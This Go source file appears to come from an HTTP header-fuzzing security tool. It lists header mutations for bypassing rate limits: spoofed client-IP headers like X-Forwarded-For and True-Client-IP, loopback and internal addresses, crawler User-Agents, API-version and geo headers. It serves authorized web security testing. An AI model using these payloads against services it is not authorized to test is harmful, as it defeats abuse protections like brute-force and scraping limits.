package headers

import "github.com/cc1a2b/hhunter/engine"

func GetRateLimitMutations() []engine.Mutation {
	return []engine.Mutation{
		// IP rotation headers for rate limit bypass
		{Header: "X-Forwarded-For", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via XFF"},
		{Header: "X-Forwarded-For", Value: "10.0.0.1", Category: "RateLimit", Impact: "Rate Limit Bypass via Internal IP"},
		{Header: "X-Forwarded-For", Value: "172.16.0.1", Category: "RateLimit", Impact: "Rate Limit Bypass via Private IP"},
		{Header: "X-Forwarded-For", Value: "192.168.0.1", Category: "RateLimit", Impact: "Rate Limit Bypass via LAN IP"},
		{Header: "X-Forwarded-For", Value: "8.8.8.8", Category: "RateLimit", Impact: "Rate Limit Bypass via Google DNS"},
		{Header: "X-Forwarded-For", Value: "1.1.1.1", Category: "RateLimit", Impact: "Rate Limit Bypass via Cloudflare DNS"},

		{Header: "X-Real-IP", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via X-Real-IP"},
		{Header: "X-Real-IP", Value: "10.0.0.1", Category: "RateLimit", Impact: "Rate Limit Bypass via Internal X-Real-IP"},
		{Header: "X-Client-IP", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via X-Client-IP"},
		{Header: "X-Originating-IP", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via X-Originating-IP"},
		{Header: "X-Remote-IP", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via X-Remote-IP"},
		{Header: "X-Remote-Addr", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via X-Remote-Addr"},
		{Header: "True-Client-IP", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via True-Client-IP"},
		{Header: "CF-Connecting-IP", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via CF-Connecting-IP"},
		{Header: "Fastly-Client-IP", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via Fastly-Client-IP"},
		{Header: "Client-IP", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via Client-IP"},
		{Header: "X-Cluster-Client-IP", Value: "1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via X-Cluster-Client-IP"},

		// Null/reset headers
		{Header: "X-Forwarded-For", Value: "", Category: "RateLimit", Impact: "Rate Limit Reset via Empty XFF"},
		{Header: "X-Forwarded-For", Value: "unknown", Category: "RateLimit", Impact: "Rate Limit Bypass via Unknown XFF"},
		{Header: "X-Forwarded-For", Value: "127.0.0.1, 1.2.3.4", Category: "RateLimit", Impact: "Rate Limit Bypass via XFF Chain"},
		{Header: "X-Forwarded-For", Value: "1.2.3.4, 127.0.0.1", Category: "RateLimit", Impact: "Rate Limit Bypass via XFF Chain Reverse"},

		// API versioning to bypass rate limits
		{Header: "X-Api-Version", Value: "v2", Category: "RateLimit", Impact: "Rate Limit Bypass via API Version"},
		{Header: "X-Api-Version", Value: "internal", Category: "RateLimit", Impact: "Rate Limit Bypass via Internal API"},
		{Header: "Api-Version", Value: "2", Category: "RateLimit", Impact: "Rate Limit Bypass via Api-Version"},

		// User-Agent rotation
		{Header: "User-Agent", Value: "Googlebot/2.1 (+http://www.google.com/bot.html)", Category: "RateLimit", Impact: "Rate Limit Bypass via Googlebot UA"},
		{Header: "User-Agent", Value: "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)", Category: "RateLimit", Impact: "Rate Limit Bypass via Bingbot UA"},
		{Header: "User-Agent", Value: "facebookexternalhit/1.1", Category: "RateLimit", Impact: "Rate Limit Bypass via Facebook Crawler UA"},
		{Header: "User-Agent", Value: "Twitterbot/1.0", Category: "RateLimit", Impact: "Rate Limit Bypass via Twitter Crawler UA"},

		// Request ID manipulation
		{Header: "X-Request-ID", Value: "00000000-0000-0000-0000-000000000000", Category: "RateLimit", Impact: "Rate Limit Bypass via Request-ID Reset"},
		{Header: "X-Correlation-ID", Value: "bypass-rate-limit", Category: "RateLimit", Impact: "Rate Limit Bypass via Correlation-ID"},

		// Accept-Language for geo-based rate limiting
		{Header: "Accept-Language", Value: "en-US,en;q=0.9", Category: "RateLimit", Impact: "Geo Rate Limit Bypass via Accept-Language"},
		{Header: "CF-IPCountry", Value: "US", Category: "RateLimit", Impact: "Geo Rate Limit Bypass via CF-IPCountry"},
		{Header: "CF-IPCountry", Value: "GB", Category: "RateLimit", Impact: "Geo Rate Limit Bypass via CF-IPCountry GB"},
	}
}
